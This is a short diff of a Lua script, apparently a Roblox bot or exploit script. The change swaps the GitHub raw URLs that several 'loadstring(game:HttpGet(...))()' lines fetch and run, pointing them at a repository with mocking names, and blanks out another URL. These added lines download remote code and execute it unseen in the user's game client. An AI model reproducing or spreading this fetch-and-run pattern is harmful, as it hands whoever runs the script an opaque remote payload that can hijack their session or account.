@@ -293,9 +293,9 @@ Bot.Config = {
         Bot.State.loopCreated = false; 
     end
     gameService = game;
-    loadstring(gameService:HttpGet("https://raw.githubusercontent.com/yuvic123/Unthinkable-Present/refs/heads/main/UP"))();
+    loadstring(gameService:HttpGet("https://raw.githubusercontent.com/kfclover67/skidoshit/refs/heads/main/sumshitidk"))();
     gameService = game;
-    loadstring(gameService:HttpGet("https://raw.githubusercontent.com/YuvicHaha/batoon/refs/heads/main/bat"))();
+    loadstring(gameService:HttpGet("https://raw.githubusercontent.com/kfclover67/skidoshit/refs/heads/main/whydouneedthisskid"))();
     pcallResult = game;
     loadedCheck = not pcallResult.IsLoaded(pcallResult);
     if loadedCheck then
@@ -313,7 +313,7 @@ Bot.Config = {
     pcall(function(...)
     end);
     formatMethod = game;
-    loadstring(formatMethod:HttpGet("https://raw.githubusercontent.com/yuvic123/asdwqe/refs/heads/main/awdwqeq"))();
+    loadstring(formatMethod:HttpGet(""))();
     danceAnimations = {};
     danceMetadata = {};
     playersServiceHolder = game;
